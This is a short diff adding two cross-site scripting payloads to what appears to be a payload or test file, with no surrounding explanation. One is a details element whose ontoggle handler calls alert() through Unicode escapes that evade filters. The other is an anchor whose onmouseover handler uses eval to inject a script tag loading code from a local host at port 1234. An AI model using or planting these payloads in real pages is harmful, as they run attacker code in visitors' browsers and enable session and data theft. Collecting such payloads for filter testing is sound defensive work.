@@ -1,0 +1,5 @@
+<details ontoggle="\u{61}le\u{72}t()" open>test</details>
+
+
+
+<a onmouseover="eval(body.appendChild(document.createElement`script`).src='http://localhost:1234/a.js'"></a>
